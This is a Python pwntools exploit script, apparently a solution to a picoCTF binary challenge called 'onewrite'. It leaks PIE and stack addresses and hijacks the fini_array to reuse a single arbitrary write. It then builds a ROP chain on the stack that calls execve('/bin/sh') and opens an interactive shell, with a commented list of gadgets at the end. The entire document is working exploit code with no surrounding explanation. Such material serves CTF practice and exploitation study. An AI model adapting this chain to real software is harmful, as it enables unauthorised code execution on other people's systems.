#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./onewrite", checksec=False)
#libc = exe.libc
#libc = ELF("/tmp/libc6_2.35-0ubuntu3.10_i386.so", checksec=False)

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*main-0x0000000000008AB8+0x0000000000008A0A
        c
        c 4 
	''')
#input()

def leak(choice, msg="skip"):
    sla(b" > ", str(choice).encode())
    return warn(int(p.recvline(), 16), msg)

def write(addr, data, check=0):
    sa(b"address : ", str(addr).encode())
    sa(b"data : ", p64(data) if not check else data) 

def pie(offset):
    return exe.address + offset

pie_leak = leak(2, "Pie leak")
exe.address = warn(pie_leak - exe.sym['do_leak'], "Exe base")
write(exe.sym['__do_global_dtors_aux_fini_array_entry'] + 8, exe.sym['do_leak'])

stack_leak = leak(1, "Stack leak")
stack = warn(stack_leak - 0x18, "Stack rop")
bss = warn(exe.bss(400), "Bss")
write(exe.sym['__do_global_dtors_aux_fini_array_entry'], exe.sym['__libc_csu_fini'])

leak(1)
write(exe.sym['__do_global_dtors_aux_fini_array_entry'] + 8, exe.sym['do_overwrite'])

pop_rdi = pie(0x00000000000084fa)
pop_rsi = pie(0x000000000000d9f2)
pop_rdx = pie(0x00000000000484c5)
pop_rax = pie(0x00000000000460ac)
syscall = pie(0x000000000000917c)
add_rsp = pie(0x00000000000563d9)

write(bss, b"/bin/sh\0", 1)
write(stack + 0x00, pop_rdi)
write(stack + 0x08, bss)
write(stack + 0x10, pop_rsi)
write(stack + 0x18, 0)
write(stack + 0x20, pop_rdx)
write(stack + 0x28, 0)
write(stack + 0x30, pop_rax)
write(stack + 0x38, 0x3b)
write(stack + 0x40, syscall)

write(stack_leak - 0x168, add_rsp)

p.interactive()
#
#
##0x0000000000031a9b : mov qword ptr [rdi], rcx ; ret
##0x0000000000031da3 : mov qword ptr [rdi], rdx ; ret
##0x00000000000437db : mov qword ptr [rdi], rsi ; ret
##
##0x00000000000084fa : pop rdi ; ret
##0x000000000000d9f2 : pop rsi ; ret
##0x00000000000484c5 : pop rdx ; ret
##0x00000000000460ac : pop rax ; ret
##0x000000000000917c : syscall
##
##0x000000000000946a : pop rsp ; ret
##0x0000000000008076 : ret
##0x00000000000563d9 : add rsp, 0x148 ; ret
